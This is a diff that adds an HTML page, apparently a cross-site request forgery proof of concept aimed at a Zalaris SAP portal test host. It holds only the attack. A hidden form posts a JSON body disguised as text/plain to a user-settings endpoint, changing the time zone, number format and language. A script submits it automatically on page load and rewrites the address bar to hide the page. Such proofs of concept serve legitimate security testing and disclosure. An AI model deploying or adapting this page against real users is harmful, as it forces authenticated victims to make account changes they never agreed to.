@@ -1,0 +1,7 @@
+<html><body><script>history.pushState('', '', '/')</script><form action="https://testportal.zalaris.com/neptune/zalaris_launchpad_standard?ajax_id=USER_DEFAULT_UPDATE&ajax_applid=ZALARIS_LAUNCHPAD_STANDARD&sap-client=510&dxp=21100006&field_id=01109&ajax_value=language" method="POST" enctype="text/plain"><input type="hidden" name="&#123;&quot;WA&#95;USER&#95;DEFAULT&quot;&#58;&#123;&quot;EDIT&quot;&#58;true&#44;&quot;TZONE&quot;&#58;&quot;RUS05&quot;&#44;&quot;TZONE&#95;DESCRIPT&quot;&#58;&quot;Russia&#32;&#40;UTC&#43;05&#41;&quot;&#44;&quot;NUMBER&#95;GROUPING&quot;&#58;&quot;&#95;&quot;&#44;&quot;NUMBER&#95;DECIMAL&quot;&#58;&quot;&#44;&quot;&#44;&quot;DCPFM&quot;&#58;&quot;Y&quot;&#44;&quot;TIMEFM&quot;&#58;&quot;4&quot;&#44;&quot;LANGU&quot;&#58;&quot;D&quot;&#125;&#125;" value="" /><input type="submit" value="Submit request" /></form><script>document.forms[0].submit();
+
+    </script>
+
+  </body>
+
+</html>
